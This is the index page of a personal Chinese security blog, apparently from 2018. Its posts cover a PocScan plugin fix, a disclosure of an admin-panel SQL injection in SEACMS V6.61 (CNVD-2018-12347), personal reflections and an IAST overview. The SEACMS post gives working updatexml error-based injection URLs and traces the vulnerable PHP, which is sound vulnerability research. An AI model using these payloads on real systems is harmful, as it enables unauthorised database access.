<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Moonfish&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Moonfish&#39;s blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Moonfish&#39;s blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Moonfish's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Moonfish's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Startseite
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archiv
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/05/PocScan-无法加载bugscan插件的解决办法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="moonfish">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moonfish's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/05/PocScan-无法加载bugscan插件的解决办法/" itemprop="url">PocScan 无法加载bugscan插件的解决办法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-05T17:03:33+08:00">
                2018-07-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近想写一个插件式扫描器，顺便研究了一下PocScan</p>
<p><a href="https://github.com/erevus-cn/pocscan/" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan/</a></p>
<p>这个扫描器刚开源的时候很火，记得之前众测的时候还有公司将它部署到生产环境上，开了Debug信息。</p>
<p>在项目的Issues多次提到不兼容问题，但是一直没有修复，所以就看一下问题出在哪里。</p>
<p>加载bugscan插件后扫了一下自己的VPS，查看日志之后发现payload是发过来了，说明是结果存储反馈的过程除了问题。</p>
<p>文件 <code>/pocscan/blob/master/pocscan/plugins/bugscan/dummy/__init__.py</code></p>
<pre><code>def _problem(*args, **kwargs):
    # 从栈里取poc名字
    import inspect
    poc_name =  inspect.stack()[1][1]
    log = kwargs[&apos;log&apos;]
</code></pre><p><img src="/2018/07/05/PocScan-无法加载bugscan插件的解决办法/init.png" alt=""></p>
<ul>
<li>这里传入的参数用*args就可以了</li>
<li>作者的本意是获取log中的url，事实上在旧版的插件中并不返回log,log 是新插件中hackhttp函数返回的</li>
</ul>
<p><img src="/2018/07/05/PocScan-无法加载bugscan插件的解决办法/test.png" alt=""></p>
<p>简单粗暴直接将38行修改成</p>
<pre><code>def _problem(*args):
    # 从栈里取poc名字
    import inspect
    poc_name = inspect.stack()[1][1]
    result = [&apos;note&apos;, &apos;info&apos;, &apos;warning&apos;, &apos;hole&apos;][args[0]]
    save_result(args[1], poc_name, result + &apos;: &apos;+poc_name)
</code></pre><p>扫描一下看结果：</p>
<p><img src="/2018/07/05/PocScan-无法加载bugscan插件的解决办法/result.png" alt=""></p>
<p>总结：这个扫描器从学习的角度来讲具有借鉴意义，但并不适合部署使用。</p>
<p>后续我会写一下我的插件式扫描器的开发过程，在此立个flag。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="moonfish">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moonfish's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/" itemprop="url">SEACMS最新版(V6.61)后台SQL注入[CNVD-2018-12347]</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-08T09:20:35+08:00">
                2018-06-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>后台注入，需要登录</p>
<p>注入点在order by 后面</p>
<p>正常访问时：</p>
<pre><code>http://localhost/seacmsv6.61/meet/admin_news.php?n_commend=&amp;order=n_id--#&amp;page=0&amp;type=
</code></pre><p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片1.png" alt=""></p>
<p>倒序时：</p>
<pre><code>http://localhost/seacmsv6.61/meet/admin_news.php?n_commend=&amp;order=n_id+desc--#&amp;page=0&amp;type=
</code></pre><p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片2.png" alt=""></p>
<p>使用updatexml进行报错注入</p>
<pre><code>http://localhost/seacmsv6.61/meet/admin_news.php?n_commend=&amp;order=n_id+and(updatexml(1,concat(0x7e,(select%20user())),0))--#&amp;page=0&amp;type=
</code></pre><p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片3.png" alt=""></p>
<h2 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h2><p>漏洞文件：</p>
<pre><code>\seacmsV6.61\admin\templets\admin_news.htm
</code></pre><p>admin_news.php 中使用include包含该文件</p>
<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片4.png" alt=""></p>
<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片5.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$numPerPage=20;</span><br><span class="line">if(empty($order)) $order=&quot;n_addtime&quot;;  //$order的值不为空</span><br><span class="line">$orderStr= &quot; order by d.$order desc&quot;; // d拼接$order</span><br><span class="line">$page = isset($page) ? intval($page) : 1;</span><br><span class="line">if($page==0) $page=1;</span><br><span class="line">$whereStr=&quot;  &quot;;</span><br><span class="line">if ($action==&quot;nullpic&quot;) $whereStr.=&quot; and d.v_pic=&apos;&apos;&quot;;</span><br><span class="line">if ($n_recycled==&quot;ok&quot;) $whereStr.=&quot; and d.n_recycled=1&quot;;</span><br><span class="line">if (!empty($type)) $whereStr.=&quot; and d.tid in (&quot;.getTypeId($type).&quot;)&quot;;</span><br><span class="line">if (!empty($keyword)) $whereStr.=&quot; and d.n_title like &apos;%&quot;.$keyword.&quot;%&apos;&quot;;</span><br><span class="line">$whereorder = str_replace(&quot;where order&quot;,&quot;order&quot;,str_replace(&quot;where and&quot;,&quot;and&quot;,$whereStr.$orderStr)); //$whereorder 即为&quot;  order by d.$order desc&quot;</span><br><span class="line">$csqlStr=&quot;select count(*) as dd from `sea_news` d where d.n_recycled=0 &quot;.$whereorder; //第一处拼接查询语句</span><br><span class="line">if ($n_recycled==&quot;ok&quot;)$csqlStr=&quot;select count(*) as dd from `sea_news` d where d.n_recycled=1 &quot;.$whereorder;</span><br><span class="line">$row = $dsql-&gt;GetOne($csqlStr); 进入GetOne()</span><br><span class="line">if(is_array($row))&#123;</span><br><span class="line">$TotalResult = $row[&apos;dd&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$TotalResult = 0;</span><br><span class="line">&#125;</span><br><span class="line">$TotalPage = ceil($TotalResult/$numPerPage);</span><br><span class="line">if ($page&gt;$TotalPage) $page=$TotalPage;</span><br><span class="line">$limitstart = ($page-1) * $numPerPage;</span><br><span class="line">if($limitstart&lt;0) $limitstart=0;</span><br><span class="line">$sqlStr=&quot;select d.n_id,d.n_title,d.n_hit,0,d.tid,d.n_addtime,d.n_commend,t.tname from sea_news d left join `sea_type` t on t.tid=d.tid where d.n_recycled=0 &quot;.$whereorder.&quot; limit $limitstart,$numPerPage&quot;; //第二处拼接查询语句</span><br><span class="line">if ($n_recycled==&quot;ok&quot;) $sqlStr=&quot;select d.n_id,d.n_title,d.n_hit,0,d.tid,d.n_addtime,d.n_commend,t.tname from sea_news d left join `sea_type` t on t.tid=d.tid  where 1=1 &quot;.$whereorder.&quot; limit $limitstart,$numPerPage&quot;;</span><br><span class="line">//echo $sqlStr;die();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>跟进GetOne()</p>
<pre><code>seacmsV6.61\include\sql.class.php
</code></pre><p>主要是看Execute()</p>
<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片6.png" alt=""></p>
<p>数据在进入mysql_query()之前会进行SQL语句安全检查，重点在这</p>
<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片7.png" alt=""></p>
<p>这里的$this-&gt;safeCheck前面赋值为true,但是我们的payload没有进入SQL语句安全检测，为什么呢<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  if($this-&gt;safeCheck)</span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            CheckSql($this-&gt;queryString);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>admin_news.php 中包含seacmsV6.61\admin\config.php</p>
<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片8.png" alt=""></p>
<p>config.php中的$dsql-&gt;safeCheck=false，所以就跳过了CheckSql()这个检查函数,SQL注入因此产生</p>
<p><img src="/2018/06/08/海洋CMS最新版-V6-61-后台SQL注入/图片9.png" alt=""></p>
<p>看到有人用这个洞申请CVE，想想也没什么意思。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/01/好记性不如烂笔头/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="moonfish">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moonfish's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/06/01/好记性不如烂笔头/" itemprop="url">好记性不如烂笔头</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-06-01T14:37:51+08:00">
                2018-06-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近暴露了许多问题：理论基础不牢固，心态容易失衡，这种情况下表达能力会降低，做过的项目很容易忘记。</p>
<p>如何解决：</p>
<ol>
<li>多读书，同时做笔记</li>
<li>早读，将一些笔记内容熟读</li>
<li>整理做过的事情或者项目，系统化理论化</li>
<li>摆正心态，不管在哪里，不能消沉放弃</li>
<li>提高用语言表达技术、用文档表达技术的能力</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/11/关于工作、生活/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="moonfish">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moonfish's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/11/关于工作、生活/" itemprop="url">关于工作、生活</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-11T14:11:09+08:00">
                2018-05-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>最近看到一个前辈说，优秀的人思想都是独立的，深以为然。循规蹈矩的人很难有什么创造力，最敏锐的心思，往往是从磨炼中来的。</p>
<p>离职之后轻松许多，大多数时间都在独处。独处是窥视内心最好的时候，如果感到空虚，必然会带来散漫，进一步就是消极。</p>
<p>有时候计划无法完成时往往会感到焦虑，然而达到目标的最好做法就是按部就班的做下去，过程比结果重要。</p>
<p>想了一些事情以后用来提升核心竞争力：</p>
<ol>
<li>保持代码量，从开发的角度理解漏洞</li>
<li>技能的熟练度</li>
<li>前瞻性，掌握某一领域未来发展方向</li>
<li>多付出一点、多承担、多学习</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/18/IAST简述/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="moonfish">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moonfish's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/18/IAST简述/" itemprop="url">IAST简述</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-18T00:56:16+08:00">
                2017-12-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>IAST（Interactive Application Security Testing)-交互式应用安全测试。2012年由gartner公司提出，其博客 <a href="https://blogs.gartner.com/neil_macdonald/2012/01/30/interactive-application-security-testing/" target="_blank" rel="noopener">Interactive Application Security Testing</a> 对IAST的定义是：<br><code>Specifically, we are looking for ways that application security testing solutions combine dynamic and static techniques to improve the overall quality of the testing results. The information gathered by this instrumentation agent gives the hybrid solution an inside-out view that complements the outside-in view of a purely DAST solution — for example, identifying the specific line of code where a security vulnerability occurred, or providing detailed visibility into code coverage.</code></p>
<p>大意是结合动态（DAST）和静态(SAST)扫描的方式提高扫描结果的质量.通过插桩的方式收集应用内部的信息，从而弥补纯DAST扫描的不足，比如确定漏洞发生的代码行数或者提供一个详细的可视化的代码范围。<br>IAST = DAST(Dynamic Application Security Testing) + SAST(Static Application Security Testing)</p>
<p>DAST：动态扫描，即黑盒扫描，如AWVS，APPSCAN，检测运行时的应用<br><img src="/2017/12/18/IAST简述/dast.png" alt=""><br>SAST: 静态扫描，即白盒扫描，如RIPS，Fortify，代码层面的漏洞检测<br><img src="/2017/12/18/IAST简述/sast.png" alt=""></p>
<h3 id="IAST的两种模式"><a href="#IAST的两种模式" class="headerlink" title="IAST的两种模式"></a>IAST的两种模式</h3><h4 id="Active-IAST-Induced-IAST"><a href="#Active-IAST-Induced-IAST" class="headerlink" title="Active IAST(Induced IAST)"></a>Active IAST(Induced IAST)</h4><p>这种模式的检测能力需要一个外部的扫描器去触发应用内部的agent，简单来说，它可以检测到DAST检测不到的漏洞。比如说，一个无法回显或无法被DAST检测的漏洞可以被Active IAST发现，然后与DAST进行交互，从而判断攻击是否成功，同时通过追踪变量，精确定位漏洞代码的位置。不过这个模式有个缺点，DAST扫描去触发漏洞需要一定的时间，同时黑盒扫描器也需要去配置和维护，所以并不推荐在CI\CD 和 DevOps环境中使用。<br><img src="/2017/12/18/IAST简述/active.png" alt=""><br>相关安全产品<br><img src="/2017/12/18/IAST简述/active-iast.png" alt=""><br>AWVS acusensor<br><img src="/2017/12/18/IAST简述/awvs.png" alt=""><br>BURP infiltrator<br><img src="/2017/12/18/IAST简述/infiltrator_issue.png" alt=""></p>
<h4 id="Passive-IAST-Self-Sufficient"><a href="#Passive-IAST-Self-Sufficient" class="headerlink" title="Passive IAST(Self Sufficient)"></a>Passive IAST(Self Sufficient)</h4><p>Passive IAST 也需要一个插桩到测试应用中的agent，但这个agent是独立的，可以在应用运行时被动地监听和分析代码，通过扫描运行中的代码查找漏洞。Passive IAST并不攻击应用，所以它并不会干扰其他的安全测试活动，只要普通的业务测试（手工或自动的访问）就可以进行安全测试。当有人（或工具）对应用进行测试时，IAST会分析数据流，从而找到潜在的漏洞，并上报到控制台。<br><img src="/2017/12/18/IAST简述/passive.png" alt=""><br>360skywolf<br><img src="/2017/12/18/IAST简述/skywolf.png" alt=""><br>contrast security<br><img src="/2017/12/18/IAST简述/contrast.png" alt=""></p>
<h3 id="agent收集的信息"><a href="#agent收集的信息" class="headerlink" title="agent收集的信息"></a>agent收集的信息</h3><ul>
<li>请求数据和返回数据</li>
<li>代码执行中的参数传递</li>
<li>数据库查询（如ODBC），目录查询（如LDAP），文件系统权限</li>
<li>运行时字符的操作（字符合并分割）</li>
<li>监听内存中特定的值，识别受污染的输入</li>
<li>三方库的使用</li>
<li>对外部应用程序或服务的调用</li>
<li>特定代码行的执行</li>
<li>……..</li>
</ul>
<h3 id="IAST的特点"><a href="#IAST的特点" class="headerlink" title="IAST的特点"></a>IAST的特点</h3><ul>
<li>误报率低<br>IAST定位到漏洞代码行数，从而清除误报。</li>
<li>测试时间短<br>探针可以跟踪变量参数的传递（数据库、文件操作等），然后控制台针对这些操作做出相关的攻击测试</li>
<li>支持JAVA,.NET,Node.js,PHP,Python等语言开发的WEB应用</li>
<li>即时反馈</li>
</ul>
<p>参考：<br><a href="https://blog.secodis.com/2015/11/26/the-emerge-of-iast/" target="_blank" rel="noopener">https://blog.secodis.com/2015/11/26/the-emerge-of-iast/</a><br><a href="https://dzone.com/articles/ciso-how-to-own-your-applications-security" target="_blank" rel="noopener">https://dzone.com/articles/ciso-how-to-own-your-applications-security</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">moonfish</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">Artikel</span>
                </a>
              </div>
            

            

            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">moonfish</span>

  
</div>


  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




<!--page counter part-->
<script>
function addCount (Counter) {
        url=$('.article-date').attr('href').trim();
        title = $('.article-title').text().trim();
        var query=new AV.Query(Counter);
        //use url as unique idnetfication
        query.equalTo("url",url);
        query.find({
            success: function(results){
                if(results.length>0)
                {
                    var counter=results[0];
                    counter.fetchWhenSave(true); //get recent result
                    counter.increment("time");
                    counter.save();
                }
                else
                {
                    var newcounter=new Counter();
                    newcounter.set("title",title);
                    newcounter.set("url",url);
                    newcounter.set("time",1);
                    newcounter.save(null,{
                        success: function(newcounter){
                        //alert('New object created');
                        },
                        error: function(newcounter,error){
                        alert('Failed to create');
                        }
                        });
                }
            },
            error: function(error){
                //find null is not a error
                alert('Error:'+error.code+" "+error.message);
            }
        });
}
$(function(){
        var Counter=AV.Object.extend("Counter");
        //only increse visit counting when intering a page
        if ($('.article-title').length == 1)
           addCount(Counter);
        var query=new AV.Query(Counter);
        query.descending("time");
        // the sum of popular posts
        query.limit(10); 
        query.find({
            success: function(results){
                    for(var i=0;i<results.length;i++)    
                    {
                        var counter=results[i];
                        title=counter.get("title");
                        url=counter.get("url");
                        time=counter.get("time");
                        // add to the popularlist widget
                        showcontent=title+" ("+time+")";
                        //notice the "" in href
                        $('.popularlist').append('<li><a href="'+url+'">'+showcontent+'</a></li>');
                    }
                },
            error: function(error){
                alert("Error:"+error.code+" "+error.message);
            }
            }
        )
        });
</script>

        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
